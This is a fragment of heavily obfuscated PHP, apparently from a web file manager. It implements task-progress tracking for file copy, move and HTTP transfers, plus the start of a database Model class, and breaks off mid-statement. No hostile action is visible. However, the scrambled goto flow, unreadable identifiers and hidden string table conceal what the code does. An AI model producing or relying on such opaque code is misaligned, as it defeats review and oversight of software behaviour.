$eŞä‡„¾‰‰ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dÕ”°èŸ = self::valueGet($D‘‹©ˆãµ); if (!$dÕ”°èŸ) { return !1; } goto dŸç—Å„óŒ; AœßÕ¤‰: return !0; goto Aòğ÷“Æ¯—; dŸç—Å„óŒ: $dÕ”°èŸ[$eŞä‡„¾‰‰[694]] = $Bãï“ìˆ÷; self::valueSet($D‘‹©ˆãµ, $dÕ”°èŸ); self::log($eŞä‡„¾‰‰[1505] . $dÕ”°èŸ[$eŞä‡„¾‰‰[397]] . $eŞä‡„¾‰‰[1506] . $Bãï“ìˆ÷); goto AœßÕ¤‰; Aòğ÷“Æ¯—: } public static function valueGet($BÉ„Ãëìåî = false) { $cŞÑ®–²‰ñ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($BÉ„Ãëìåî) { $b±±ô‚Á˜‡ = Model($cŞÑ®–²‰ñ[428])->where(array($cŞÑ®–²‰ñ[102] => $BÉ„Ãëìåî, $cŞÑ®–²‰ñ[29] => $cŞÑ®–²‰ñ[1507]))->find(); return $b±±ô‚Á˜‡ ? json_decode($b±±ô‚Á˜‡[$cŞÑ®–²‰ñ[380]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($BŠ«‰·óŞ = false) { goto cÜí±ÓàÅ«; cò·…°êôÛ: return $B®™º—íó; goto aŞ± –åº‘; cÜí±ÓàÅ«: $bé¬Ê»ÓÈá =& $_SERVER[í¤âËÚ£¶íÊ¢]; $f×™³•® = array($bé¬Ê»ÓÈá[29] => $bé¬Ê»ÓÈá[1507]); if ($BŠ«‰·óŞ) { $f×™³•®[$bé¬Ê»ÓÈá[1487]] = $BŠ«‰·óŞ; } goto F‰©«×ƒÉÕ; F‰©«×ƒÉÕ: $B®™º—íó = Model($bé¬Ê»ÓÈá[428])->where($f×™³•®)->select(); $B®™º—íó = $B®™º—íó ? $B®™º—íó : array(); foreach ($B®™º—íó as $A Ôã‡Ü¶ => $e²Ï÷‡ô”¹) { $B®™º—íó[$A Ôã‡Ü¶] = json_decode($e²Ï÷‡ô”¹[$bé¬Ê»ÓÈá[380]], !0); } goto cò·…°êôÛ; aŞ± –åº‘: } public static function valueSet($b…Ïååà‡ê, $A³²–ĞŠ¸Ê) { goto b¦ƒº”·ìˆ; d÷ÜÏºìà”: Model($EïóÌ’Äõ[428])->add($eÉÌ•¹°–ß, array(), !0); goto Aç”´¦•Õö; b¦ƒº”·ìˆ: $EïóÌ’Äõ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$A³²–ĞŠ¸Ê) { return Model($EïóÌ’Äõ[428])->where(array($EïóÌ’Äõ[102] => $b…Ïååà‡ê, $EïóÌ’Äõ[29] => $EïóÌ’Äõ[1507]))->delete(); } $c÷††·õ¤ = json_encode($A³²–ĞŠ¸Ê); goto AÅò£­œ´å; AÅò£­œ´å: if (!$c÷††·õ¤) { ob_start(); var_dump($A³²–ĞŠ¸Ê); $aó›ŠÒœ¥® = ob_get_clean(); self::log($EïóÌ’Äõ[1508] . json_encode_force($aó›ŠÒœ¥®)); } if (!$b…Ïååà‡ê || !$A³²–ĞŠ¸Ê[$EïóÌ’Äõ[397]]) { return !1; } $eÉÌ•¹°–ß = array($EïóÌ’Äõ[29] => $EïóÌ’Äõ[1507], $EïóÌ’Äõ[1487] => USER_ID, $EïóÌ’Äõ[102] => $b…Ïååà‡ê, $EïóÌ’Äõ[380] => $c÷††·õ¤); goto d÷ÜÏºìà”; Aç”´¦•Õö: } public static function log($aƒ­˜Ñ‚ó÷) { if (!GLOBAL_DEBUG) { return; } write_log($aƒ­˜Ñ‚ó÷, $_SERVER[í¤âËÚ£¶íÊ¢][1509]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto Eõù´‘‘¯; b…™ˆÜÔ: Hook::bind($C¢ÈØ‹ñì¬[1522], array($this, $C¢ÈØ‹ñì¬[1523])); Hook::bind($C¢ÈØ‹ñì¬[1524], array($this, $C¢ÈØ‹ñì¬[1525])); Hook::bind($C¢ÈØ‹ñì¬[1526], array($this, $C¢ÈØ‹ñì¬[1527])); goto E´Åã‡¢Âà; Eø‹ñÒ‡Í”: Hook::bind($C¢ÈØ‹ñì¬[543], array($this, $C¢ÈØ‹ñì¬[1518])); Hook::bind($C¢ÈØ‹ñì¬[545], array($this, $C¢ÈØ‹ñì¬[1518])); Hook::bind($C¢ÈØ‹ñì¬[547], array($this, $C¢ÈØ‹ñì¬[1518])); goto e¼Æ§Æô ©; e¼Æ§Æô ©: Hook::bind($C¢ÈØ‹ñì¬[1519], array($this, $C¢ÈØ‹ñì¬[1520])); Hook::bind($C¢ÈØ‹ñì¬[563], array($this, $C¢ÈØ‹ñì¬[1521])); $this->sourceModelCopyFlag = !1; goto b…™ˆÜÔ; Eõù´‘‘¯: $C¢ÈØ‹ñì¬ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $AÛŞ¡¸óÏ =& $this->task; $this->sourceCopyFolder = !1; goto dÄ«ÂáğÉ·; f”çÛï³æİ: $AÛŞ¡¸óÏ[$C¢ÈØ‹ñì¬[984]] = $C¢ÈØ‹ñì¬[33]; $AÛŞ¡¸óÏ[$C¢ÈØ‹ñì¬[1532]] = $C¢ÈØ‹ñì¬[33]; $AÛŞ¡¸óÏ[$C¢ÈØ‹ñì¬[1533]] = 0; goto DÉâ¸œìøÕ; fŸœ‡¤ĞÊ‡: Hook::bind($C¢ÈØ‹ñì¬[574], array($this, $C¢ÈØ‹ñì¬[1517])); Hook::bind($C¢ÈØ‹ñì¬[541], array($this, $C¢ÈØ‹ñì¬[1518])); Hook::bind($C¢ÈØ‹ñì¬[538], array($this, $C¢ÈØ‹ñì¬[1518])); goto Eø‹ñÒ‡Í”; dÄ«ÂáğÉ·: Hook::bind($C¢ÈØ‹ñì¬[1510], array($this, $C¢ÈØ‹ñì¬[1511])); Hook::bind($C¢ÈØ‹ñì¬[1069], array($this, $C¢ÈØ‹ñì¬[1512])); Hook::bind($C¢ÈØ‹ñì¬[1513], array($this, $C¢ÈØ‹ñì¬[1514])); goto dÙñÇàÍ´±; E´Åã‡¢Âà: $AÛŞ¡¸óÏ[$C¢ÈØ‹ñì¬[1528]] = LNG($C¢ÈØ‹ñì¬[1529]); $AÛŞ¡¸óÏ[$C¢ÈØ‹ñì¬[1530]] = 0; $AÛŞ¡¸óÏ[$C¢ÈØ‹ñì¬[1531]] = 0; goto f”çÛï³æİ; dÙñÇàÍ´±: Hook::bind($C¢ÈØ‹ñì¬[570], array($this, $C¢ÈØ‹ñì¬[1515])); Hook::bind($C¢ÈØ‹ñì¬[571], array($this, $C¢ÈØ‹ñì¬[1516])); Hook::bind($C¢ÈØ‹ñì¬[573], array($this, $C¢ÈØ‹ñì¬[1517])); goto fŸœ‡¤ĞÊ‡; DÉâ¸œìøÕ: $AÛŞ¡¸óÏ[$C¢ÈØ‹ñì¬[1534]] = 0; $AÛŞ¡¸óÏ[$C¢ÈØ‹ñì¬[1535]] = 0; if (!$AÛŞ¡¸óÏ[$C¢ÈØ‹ñì¬[1393]]) { $AÛŞ¡¸óÏ[$C¢ÈØ‹ñì¬[1393]] = LNG($C¢ÈØ‹ñì¬[1536]); } goto f²÷‹¹©„ƒ; f²÷‹¹©„ƒ: } protected function endAfter() { goto CÊ¤Úİ¼¸; AƒÌÈñ•—Û: Hook::unbind($fÙµÀ¬áô[547], array($this, $fÙµÀ¬áô[1518])); Hook::unbind($fÙµÀ¬áô[1519], array($this, $fÙµÀ¬áô[1520])); Hook::unbind($fÙµÀ¬áô[563], array($this, $fÙµÀ¬áô[1521])); goto böùœÑ‡±§; CÊ¤Úİ¼¸: $fÙµÀ¬áô =& $_SERVER[í¤âËÚ£¶íÊ¢]; Hook::unbind($fÙµÀ¬áô[1510], array($this, $fÙµÀ¬áô[1511])); Hook::unbind($fÙµÀ¬áô[1069], array($this, $fÙµÀ¬áô[1512])); goto Bñº°ÆÙ°; böùœÑ‡±§: Hook::unbind($fÙµÀ¬áô[1522], array($this, $fÙµÀ¬áô[1523])); Hook::unbind($fÙµÀ¬áô[1524], array($this, $fÙµÀ¬áô[1525])); Hook::unbind($fÙµÀ¬áô[1526], array($this, $fÙµÀ¬áô[1527])); goto eÄÍƒ‡Úİµ; Bñº°ÆÙ°: Hook::unbind($fÙµÀ¬áô[1513], array($this, $fÙµÀ¬áô[1514])); Hook::unbind($fÙµÀ¬áô[570], array($this, $fÙµÀ¬áô[1515])); Hook::unbind($fÙµÀ¬áô[571], array($this, $fÙµÀ¬áô[1516])); goto d“í¯Ù¬«±; d“í¯Ù¬«±: Hook::unbind($fÙµÀ¬áô[573], array($this, $fÙµÀ¬áô[1517])); Hook::unbind($fÙµÀ¬áô[574], array($this, $fÙµÀ¬áô[1517])); Hook::unbind($fÙµÀ¬áô[541], array($this, $fÙµÀ¬áô[1518])); goto A•µªÉÌ¥; A•µªÉÌ¥: Hook::unbind($fÙµÀ¬áô[538], array($this, $fÙµÀ¬áô[1518])); Hook::unbind($fÙµÀ¬áô[543], array($this, $fÙµÀ¬áô[1518])); Hook::unbind($fÙµÀ¬áô[545], array($this, $fÙµÀ¬áô[1518])); goto AƒÌÈñ•—Û; eÄÍƒ‡Úİµ: } public function copyMoveStart($B«ï–¸÷, $eÕø‡´Ó¾¼, $däƒ‰Î»ë², $FÃËÛùÇêº) { goto Eéµ£šÉÙ”; Eéµ£šÉÙ”: $bó–ƒ†ÔÉ— =& $_SERVER[í¤âËÚ£¶íÊ¢]; self::log($bó–ƒ†ÔÉ—[1537] . $eÕø‡´Ó¾¼ . $bó–ƒ†ÔÉ—[76] . $FÃËÛùÇêº); $d‡‰¼ŠÄ‚î = rtrim(TEMP_FILES, $bó–ƒ†ÔÉ—[8]); goto Dåƒ»Å£¨Â; F§¹Šºç’: $c÷ÎË˜»ø[$bó–ƒ†ÔÉ—[1538]] = KodIO::transferType($B«ï–¸÷, $däƒ‰Î»ë²); $this->update(); goto a„Ï’Î’°Â; Dåƒ»Å£¨Â: if (substr($eÕø‡´Ó¾¼, 0, strlen($d‡‰¼ŠÄ‚î)) == $d‡‰¼ŠÄ‚î) { return; } if (substr($FÃËÛùÇêº, 0, strlen($d‡‰¼ŠÄ‚î)) == $d‡‰¼ŠÄ‚î) { return; } $c÷ÎË˜»ø =& $this->task; goto F§¹Šºç’; a„Ï’Î’°Â: } public function updateAfter() { goto F·©¥²ÇËì; F¾ßñ¢‘‚ê: if ($this->sourceModelCopyFlag) { return; } if ($CİğÚ˜ï»[$B¯õ†è¨•Ç[1538]] == $B¯õ†è¨•Ç[1141]) { return; } if ($CİğÚ˜ï»[$B¯õ†è¨•Ç[1538]] == $B¯õ†è¨•Ç[1054] || $CİğÚ˜ï»[$B¯õ†è¨•Ç[1538]] == $B¯õ†è¨•Ç[116]) { if ($CİğÚ˜ï»[$B¯õ†è¨•Ç[1532]]) { $CİğÚ˜ï»[$B¯õ†è¨•Ç[1535]] = $CİğÚ˜ï»[$B¯õ†è¨•Ç[1534]] + $CİğÚ˜ï»[$B¯õ†è¨•Ç[1531]]; } } else { if ($CİğÚ˜ï»[$B¯õ†è¨•Ç[1538]] == $B¯õ†è¨•Ç[1142]) { if ($CİğÚ˜ï»[$B¯õ†è¨•Ç[1532]] == $B¯õ†è¨•Ç[1054]) { $CİğÚ˜ï»[$B¯õ†è¨•Ç[1535]] = $CİğÚ˜ï»[$B¯õ†è¨•Ç[1534]] + $CİğÚ˜ï»[$B¯õ†è¨•Ç[1531]] * 0.5; } else { if ($CİğÚ˜ï»[$B¯õ†è¨•Ç[1532]] == $B¯õ†è¨•Ç[116]) { $CİğÚ˜ï»[$B¯õ†è¨•Ç[1535]] = $CİğÚ˜ï»[$B¯õ†è¨•Ç[1534]] + $CİğÚ˜ï»[$B¯õ†è¨•Ç[1530]] * 0.5 + $CİğÚ˜ï»[$B¯õ†è¨•Ç[1531]] * 0.5; } } } } goto a¦Ò½ùˆ; F·©¥²ÇËì: $B¯õ†è¨•Ç =& $_SERVER[í¤âËÚ£¶íÊ¢]; $CİğÚ˜ï» =& $this->task; if (!$CİğÚ˜ï»[$B¯õ†è¨•Ç[703]]) { return; } goto F¾ßñ¢‘‚ê; a¦Ò½ùˆ: $CİğÚ˜ï»[$B¯õ†è¨•Ç[1488]] = $CİğÚ˜ï»[$B¯õ†è¨•Ç[1535]] / $CİğÚ˜ï»[$B¯õ†è¨•Ç[703]]; if ($CİğÚ˜ï»[$B¯õ†è¨•Ç[1488]] > 0) { $f¡µ¬ÉĞœ’ = timeFloat() - $CİğÚ˜ï»[$B¯õ†è¨•Ç[725]] - $CİğÚ˜ï»[$B¯õ†è¨•Ç[1491]]; $CİğÚ˜ï»[$B¯õ†è¨•Ç[1492]] = $f¡µ¬ÉĞœ’ * (1 - $CİğÚ˜ï»[$B¯õ†è¨•Ç[1488]]) / $CİğÚ˜ï»[$B¯õ†è¨•Ç[1488]]; } goto CñÀêì; CñÀêì: } public function addPath($D§¼¯”ƒî) { goto Eá“ƒöçÕâ; CŞ•ëíì”«: if ($Dõ§Çİë¤[$f‘‡×Œ‡ÂÉ[29]] == $f‘‡×Œ‡ÂÉ[201]) { $dç£Ú¼™÷[$f‘‡×Œ‡ÂÉ[982]] += 1; } else { $dç£Ú¼™÷[$f‘‡×Œ‡ÂÉ[982]] += $Dõ§Çİë¤[$f‘‡×Œ‡ÂÉ[90]][$f‘‡×Œ‡ÂÉ[88]]; if ($Dõ§Çİë¤[$f‘‡×Œ‡ÂÉ[399]]) { $dç£Ú¼™÷[$f‘‡×Œ‡ÂÉ[982]] += $Dõ§Çİë¤[$f‘‡×Œ‡ÂÉ[90]][$f‘‡×Œ‡ÂÉ[89]] + 1; } } $dç£Ú¼™÷[$f‘‡×Œ‡ÂÉ[703]] += $Dõ§Çİë¤[$f‘‡×Œ‡ÂÉ[87]]; $this->update(); goto Bâ‘õ…ŸÍ; Eá“ƒöçÕâ: $f‘‡×Œ‡ÂÉ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (!$D§¼¯”ƒî) { return; } $dç£Ú¼™÷ =& $this->task; goto c–º„²ÅÈ; c–º„²ÅÈ: $Dõ§Çİë¤ = IO::infoWithChildren($D§¼¯”ƒî); $b¿Éæëßá = $dç£Ú¼™÷[$f‘‡×Œ‡ÂÉ[1539]] ? $dç£Ú¼™÷[$f‘‡×Œ‡ÂÉ[1539]][$f‘‡×Œ‡ÂÉ[1540]] : 0; $dç£Ú¼™÷[$f‘‡×Œ‡ÂÉ[1539]] = array($f‘‡×Œ‡ÂÉ[1540] => $b¿Éæëßá + 1, $f‘‡×Œ‡ÂÉ[416] => $Dõ§Çİë¤[$f‘‡×Œ‡ÂÉ[28]], $f‘‡×Œ‡ÂÉ[85] => $Dõ§Çİë¤[$f‘‡×Œ‡ÂÉ[85]], $f‘‡×Œ‡ÂÉ[498] => $Dõ§Çİë¤[$f‘‡×Œ‡ÂÉ[498]] ? $Dõ§Çİë¤[$f‘‡×Œ‡ÂÉ[498]] : $Dõ§Çİë¤[$f‘‡×Œ‡ÂÉ[85]]); goto CŞ•ëíì”«; Bâ‘õ…ŸÍ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($Eí©™ô¦óõ) { $c·‚Õ•ŸÎ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $aæ‘ˆáÎ…× =& $this->task; $aæ‘ˆáÎ…×[$c·‚Õ•ŸÎ[1528]] = $Eí©™ô¦óõ[$c·‚Õ•ŸÎ[28]]; $aæ‘ˆáÎ…×[$c·‚Õ•ŸÎ[984]] = $Eí©™ô¦óõ[$c·‚Õ•ŸÎ[28]]; $this->update(); } public function copyFileStart($a”µ‰Ö†¦ö, $a±›¾œæÊÆ, $b´´Ê¼¯â, $eŞä»ƒÄ¦, $fØÉñ˜„Æ‚, $aÚ¼µ£È¯ß) { goto A©æîÅ†‹Á; bŠ ÂŞ÷–Ã: $this->update(); goto f³÷£«·ÒÖ; f±ÜÕŠ‚Ö: $E°¡ÑÅÜ±À[$cÁèã‚Àö»[1528]] = $dé…£°±‰Í; $E°¡ÑÅÜ±À[$cÁèã‚Àö»[1530]] = (int) $a”µ‰Ö†¦ö->size($a±›¾œæÊÆ); $E°¡ÑÅÜ±À[$cÁèã‚Àö»[1531]] = 0; goto e˜Ñ§ç²‚; fâ‹ÀÑğ²ê: $GLOBALS[$cÁèã‚Àö»[1542]] = $fØÉñ˜„Æ‚; $GLOBALS[$cÁèã‚Àö»[1541]] = $aÚ¼µ£È¯ß; $E°¡ÑÅÜ±À =& $this->task; goto f±ÜÕŠ‚Ö; A©æîÅ†‹Á: $cÁèã‚Àö» =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dé…£°±‰Í = $fØÉñ˜„Æ‚; if ($dé…£°±‰Í == $GLOBALS[$cÁèã‚Àö»[1541]]) { $dé…£°±‰Í = $GLOBALS[$cÁèã‚Àö»[1542]]; } goto fâ‹ÀÑğ²ê; e˜Ñ§ç²‚: $E°¡ÑÅÜ±À[$cÁèã‚Àö»[984]] = $cÁèã‚Àö»[33]; $E°¡ÑÅÜ±À[$cÁèã‚Àö»[1532]] = $cÁèã‚Àö»[33]; $E°¡ÑÅÜ±À[$cÁèã‚Àö»[1533]] = 0; goto bŠ ÂŞ÷–Ã; f³÷£«·ÒÖ: } public function copyFileEnd($A¿ìÀÄ«Ü, $EÜäŞØ©ñ, $F¨·šÜ¡£, $dóóğÊ„Í‰, $C»‡½ïÑ©, $f‰¾´íÆ¢) { $B¦‡Òùé =& $_SERVER[í¤âËÚ£¶íÊ¢]; $déİ„‚¨½É =& $this->task; $déİ„‚¨½É[$B¦‡Òùé[1531]] = $déİ„‚¨½É[$B¦‡Òùé[1530]]; $déİ„‚¨½É[$B¦‡Òùé[1532]] = $B¦‡Òùé[33]; if ($C»‡½ïÑ© == $déİ„‚¨½É[$B¦‡Òùé[1528]]) { $déİ„‚¨½É[$B¦‡Òùé[1534]] += $déİ„‚¨½É[$B¦‡Òùé[1530]]; $déİ„‚¨½É[$B¦‡Òùé[1535]] = $déİ„‚¨½É[$B¦‡Òùé[1534]]; $this->update(1); } else { $this->update(); $déİ„‚¨½É[$B¦‡Òùé[1531]] = 0; } self::log($B¦‡Òùé[1543] . $EÜäŞØ©ñ . $B¦‡Òùé[76] . $dóóğÊ„Í‰ . $B¦‡Òùé[63] . $C»‡½ïÑ© . $B¦‡Òùé[1544] . $déİ„‚¨½É[$B¦‡Òùé[1528]]); } public function updateFileEnd($f°ùáİá, $dÖ—ŸñäŞ¦) { goto C·³õ«ñÌ; fäËÈŠÚóô: $this->update(1); self::log($f‹§Š¬²ˆ[1545] . $f°ùáİá); goto C¡ÂÕ­Ü˜í; C·³õ«ñÌ: $f‹§Š¬²ˆ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cªøàŒõ =& $this->task; $cªøàŒõ[$f‹§Š¬²ˆ[1528]] = $f°ùáİá; goto a‰ø¶·©¯Ï; a‰ø¶·©¯Ï: $cªøàŒõ[$f‹§Š¬²ˆ[1530]] = $dÖ—ŸñäŞ¦; $cªøàŒõ[$f‹§Š¬²ˆ[1534]] += $dÖ—ŸñäŞ¦; $cªøàŒõ[$f‹§Š¬²ˆ[1535]] = $cªøàŒõ[$f‹§Š¬²ˆ[1534]]; goto fäËÈŠÚóô; C¡ÂÕ­Ü˜í: } public function sourceModelCopy($Aîï’ìñ˜¥) { goto bÜ§‹ô ˆ; DîÇƒçŠµª: switch ($bËª‰õòÄÜ) { case $b°‘Ä¡ÛÖ¥[539]: $CÆã¼ƒ‹ó½ = 1; break; case $b°‘Ä¡ÛÖ¥[542]: $dÔï·Ü’†ï[$b°‘Ä¡ÛÖ¥[1528]] = $FóÈ‚¨¼ƒË[$b°‘Ä¡ÛÖ¥[28]]; break; case $b°‘Ä¡ÛÖ¥[544]: $CÆã¼ƒ‹ó½ = intval($Aîï’ìñ˜¥[$b°‘Ä¡ÛÖ¥[384]] * 0.4); break; case $b°‘Ä¡ÛÖ¥[546]: $CÆã¼ƒ‹ó½ = intval($Aîï’ìñ˜¥[$b°‘Ä¡ÛÖ¥[384]] * 0.2); break; case $b°‘Ä¡ÛÖ¥[548]: $CÆã¼ƒ‹ó½ = intval($Aîï’ìñ˜¥[$b°‘Ä¡ÛÖ¥[384]] * 0.4); break; } $this->update($CÆã¼ƒ‹ó½); $this->sourceModelCopyFlag = !1; goto cĞçœÁÈİ; DÂËß‚ô™: $dÔï·Ü’†ï =& $this->task; $this->sourceModelCopyFlag = !0; $CÆã¼ƒ‹ó½ = 0; goto DîÇƒçŠµª; bÜ§‹ô ˆ: $b°‘Ä¡ÛÖ¥ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bËª‰õòÄÜ = $Aîï’ìñ˜¥[0]; $FóÈ‚¨¼ƒË = $Aîï’ìñ˜¥[1]; goto DÂËß‚ô™; cĞçœÁÈİ: } public function sourceRemove($fø§Ûº®ñˆ, $c¦ØÕŠ¨×’) { $D™àš‚œ’ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->sourceModelCopyFlag = !0; $CÇœÂğåˆ = 1; if (isset($fø§Ûº®ñˆ[$D™àš‚œ’[90]])) { $CÇœÂğåˆ = $fø§Ûº®ñˆ[$D™àš‚œ’[90]][$D™àš‚œ’[88]] + $fø§Ûº®ñˆ[$D™àš‚œ’[90]][$D™àš‚œ’[89]] + 1; } $this->update($CÇœÂğåˆ); $this->sourceModelCopyFlag = !1; } public function sourceMove($BİŸà¬ÌƒÖ) { $this->sourceRemove($BİŸà¬ÌƒÖ, !1); } public function curlProgress($e÷®÷’ˆß¼, $FóèâåÃÏ¥, $Bß¢„Ñ–¡–, $CäÆŸÛó‚É, $Aİã‹©ÊîÇ) { $b­«Ö«ô†Ò =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fÎÙ½¹Šñ¡ =& $this->task; if ($Aİã‹©ÊîÇ > 0) { $fÎÙ½¹Šñ¡[$b­«Ö«ô†Ò[984]] = $b­«Ö«ô†Ò[1546]; $fÎÙ½¹Šñ¡[$b­«Ö«ô†Ò[1532]] = $b­«Ö«ô†Ò[116]; if ($fÎÙ½¹Šñ¡[$b­«Ö«ô†Ò[1530]]) { $fÎÙ½¹Šñ¡[$b­«Ö«ô†Ò[1531]] = $Aİã‹©ÊîÇ; } if ($fÎÙ½¹Šñ¡[$b­«Ö«ô†Ò[1533]]) { $fÎÙ½¹Šñ¡[$b­«Ö«ô†Ò[1531]] = $Aİã‹©ÊîÇ + $fÎÙ½¹Šñ¡[$b­«Ö«ô†Ò[1533]]; } } else { if ($Bß¢„Ñ–¡– > 0) { if ($fÎÙ½¹Šñ¡[$b­«Ö«ô†Ò[1530]] == $FóèâåÃÏ¥) { $fÎÙ½¹Šñ¡[$b­«Ö«ô†Ò[1531]] = $Bß¢„Ñ–¡–; $fÎÙ½¹Šñ¡[$b­«Ö«ô†Ò[984]] = $b­«Ö«ô†Ò[1547]; $fÎÙ½¹Šñ¡[$b­«Ö«ô†Ò[1532]] = $b­«Ö«ô†Ò[1054]; } } } $this->update(); } public function curlProgressStart($AØ˜ãåŞ³ä) { } public function curlProgressEnd($aÃ¦±Ë®¿Ñ) { goto BêÍäŸéÅÔ; BêÍäŸéÅÔ: $d™Ğ°“ ÁÙ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $D°ë±Èñ•¬ =& $this->task; $A»”Èâ†Êœ = curl_getinfo($aÃ¦±Ë®¿Ñ); goto E¯Á‡¼ÜƒÕ; E¯Á‡¼ÜƒÕ: $F§ñœ÷¬ë“ = $A»”Èâ†Êœ[$d™Ğ°“ ÁÙ[1548]]; if ($F§ñœ÷¬ë“ == -1) { $F§ñœ÷¬ë“ = $A»”Èâ†Êœ[$d™Ğ°“ ÁÙ[1549]]; } if ($D°ë±Èñ•¬[$d™Ğ°“ ÁÙ[1532]] == $d™Ğ°“ ÁÙ[116] && $F§ñœ÷¬ë“) { $D°ë±Èñ•¬[$d™Ğ°“ ÁÙ[1533]] += $F§ñœ÷¬ë“; } goto b•²æËºÆÜ; b•²æËºÆÜ: $this->update(); goto e—¿ŸĞï; e—¿ŸĞï: } } class TaskHttp extends Task { protected function startAfter() { $AÜ…ŸâÍ¼† =& $_SERVER[í¤âËÚ£¶íÊ¢]; $EÖ±šÔÁÎ¸ =& $this->task; $EÖ±šÔÁÎ¸[$AÜ…ŸâÍ¼†[1550]] = 1; Hook::bind($AÜ…ŸâÍ¼†[1522], array($this, $AÜ…ŸâÍ¼†[1551])); Hook::bind($AÜ…ŸâÍ¼†[1524], array($this, $AÜ…ŸâÍ¼†[1552])); Hook::bind($AÜ…ŸâÍ¼†[1526], array($this, $AÜ…ŸâÍ¼†[1553])); } protected function endAfter() { $BƒŠ›Ì¦’ =& $_SERVER[í¤âËÚ£¶íÊ¢]; Hook::unbind($BƒŠ›Ì¦’[1522], array($this, $BƒŠ›Ì¦’[1551])); Hook::unbind($BƒŠ›Ì¦’[1524], array($this, $BƒŠ›Ì¦’[1552])); Hook::unbind($BƒŠ›Ì¦’[1526], array($this, $BƒŠ›Ì¦’[1553])); } public function progressStart($e³ÚÛÀ’¢´) { $CòÄì…©Ì˜ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bî¬ÅØÔ„ = curl_getinfo($e³ÚÛÀ’¢´); self::log($CòÄì…©Ì˜[1554] . $bî¬ÅØÔ„[$CòÄì…©Ì˜[312]]); self::valueSet($this->task[$CòÄì…©Ì˜[397]], $this->task); } public function progressEnd($eôÄ®ŞËÙ•) { $b±¹Ú··° =& $_SERVER[í¤âËÚ£¶íÊ¢]; self::log($b±¹Ú··°[1555] . $this->task[$b±¹Ú··°[397]]); $this->end(); } public function progress($DÀŒÃŸÎğ, $Dãˆ¢èôôï, $eÕŒ£áã—, $dœÙã¾ãí, $fëÉ¾Û–§ù) { $e…ÁõÁ”Ò =& $_SERVER[í¤âËÚ£¶íÊ¢]; $A“¤ñÍíÈß =& $this->task; if ($fëÉ¾Û–§ù > 0) { $A“¤ñÍíÈß[$e…ÁõÁ”Ò[982]] = $A“¤ñÍíÈß[$e…ÁõÁ”Ò[982]] == 0 ? $dœÙã¾ãí : $A“¤ñÍíÈß[$e…ÁõÁ”Ò[982]]; $A“¤ñÍíÈß[$e…ÁõÁ”Ò[996]] = $fëÉ¾Û–§ù; } else { if ($eÕŒ£áã— > 0) { $A“¤ñÍíÈß[$e…ÁõÁ”Ò[982]] = $A“¤ñÍíÈß[$e…ÁõÁ”Ò[982]] == 0 ? $Dãˆ¢èôôï : $A“¤ñÍíÈß[$e…ÁõÁ”Ò[982]]; $A“¤ñÍíÈß[$e…ÁõÁ”Ò[996]] = $eÕŒ£áã—; } } $this->update(); self::log("\x70\x72\157\x67\x72\x65\163\163\110\164\164\160\72\x64\x6f\x77\x6e\x3a{$eÕŒ£áã—}\57{$Dãˆ¢èôôï}\x3b\x20\x75\160\154\157\x61\144\72{$fëÉ¾Û–§ù}\57{$dœÙã¾ãí}\x3b"); } } goto DäÈŞ¨• ; Cñ•‚ÇöÙ: define($_SERVER[í¤âËÚ£¶íÊ¢][247], 0); define($_SERVER[í¤âËÚ£¶íÊ¢][248], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\145", "\x6f\x72\144\x65\162", "\x61\x6c\x69\141\x73", "\x68\141\166\x69\156\x67", "\x67\x72\x6f\x75\160", "\154\x6f\143\x6b", "\144\x69\x73\x74\151\156\143\164", "\x61\165\x74\157", "\x66\x69\x6c\x74\x65\162", "\x76\x61\x6c\x69\144\141\164\145", "\162\x65\x73\165\x6c\164", "\142\151\x6e\x64", "\164\157\x6b\x65\x6e"); public function __construct($E‚£ˆµ·ö = '', $FÚ¤âùÄĞ‰ = '', $A´„¡‰¡£ = '') { $Aªïá©ÛÑâ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $this->_initialize(); if (!empty($E‚£ˆµ·ö)) { if (strpos($E‚£ˆµ·ö, $Aªïá©ÛÑâ[104])) { list($this->dbName, $this->name) = explode($Aªïá©ÛÑâ[104], $E‚£ˆµ·ö); } else { $this->name = $E‚£ˆµ·ö; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($FÚ¤âùÄĞ‰)) { $this->tablePrefix = $Aªïá©ÛÑâ[33]; } elseif ($Aªïá©ÛÑâ[33] != $FÚ¤âùÄĞ‰) { $this->tablePrefix = $FÚ¤âùÄĞ‰; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($Aªïá©ÛÑâ[249]); } $this->db(0, empty($this->connection) ? $A´„¡‰¡£ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $aƒñóŞ˜ùŞ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (empty($this->fields)) { if (think_config($aƒñóŞ˜ùŞ[250])) { $C«¡ğ†éÜ­ = $this->dbName ? $this->dbName : think_config($aƒñóŞ˜ùŞ[251]); $aÔæ÷Üäß¢ = think_var_cache($aƒñóŞ˜ùŞ[252] . strtolower(get_path_this($C«¡ğ†éÜ­) . $aƒñóŞ˜ùŞ[104] . $this->name)); if ($aÔæ÷Üäß¢) { $FòÙ´ŒÊ†± = think_config($aƒñóŞ˜ùŞ[253]); if 